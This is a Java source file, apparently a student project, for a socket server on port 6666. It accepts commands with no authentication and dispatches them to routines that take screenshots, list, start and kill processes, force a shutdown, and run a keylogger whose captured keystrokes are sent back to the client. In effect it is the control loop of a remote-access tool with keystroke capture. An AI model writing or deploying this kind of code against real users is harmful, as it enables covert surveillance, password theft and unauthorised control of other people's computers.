package socket_server;

import java.awt.AWTException;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JButton;
import javax.swing.JFrame;

public class Main {

    public static ServerSocket server;
    public static boolean conn = false;

    public static void main(String[] args) throws Exception {

        JFrame f = new JFrame("open");
        JButton b = new JButton("open Server");
        JButton c = new JButton(" Server");
        b.setBounds(15, 15, 150, 100);

        b.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                try {
                    server = new ServerSocket(6666);
                    Socket socket;
                    keyloger key = new keyloger();
                    boolean check = true;
                    String keyText = "";
                    while (true) {
                        socket = server.accept();
                        ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                        String message = (String) ois.readObject();

                        if (message.equals("screenShot")) {
                            new screenShot().screen(socket, server);
                        } else if (message.equals("xemProcess")) {
                            new xemProcess().xem(socket, server);
                        } else if (message.equals("openProcess")) {
                            new start().start(socket, server);
                        } else if (message.equals("closeProcess")) {
                            new close().close(socket, server);
                        } else if (message.equals("shutdown")) {
                            Runtime runtime = Runtime.getRuntime();
                            runtime.exec("shutdown -s -t 5");
                        } else if (message.equals("xemApp")) {
                            new xemApp().run(socket, server);
                        } else if (message.equals("keyloger")) {
                            System.out.print("keylogering");
                            key.Run(socket, server);
                        } else if (message.equals("hook")) {
                            key.hook();
                            check = true;
                        } else if (message.equals("xemKey")) {
                            String re = "";
                            if (check == false) {
                                re = keyText;
                                key.result = keyText;
                            } else {
                                re = key.result;
                            }
                            new printText().run(socket, server, re);
                        } else if (message.equals("unhook")) {
                            keyText = key.result;
                            check = false;
                        }
                        socket.close();
                    }
                } catch (IOException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                } catch (InterruptedException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                } catch (ClassNotFoundException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                } catch (AWTException ex) {
                    Logger.getLogger(Main.class.getName()).log(Level.SEVERE, null, ex);
                }
            }
        }
        );

        f.add(b);
        
        f.setSize(200, 200);
        f.setLayout(null);
        f.setVisible(true);
    }
}
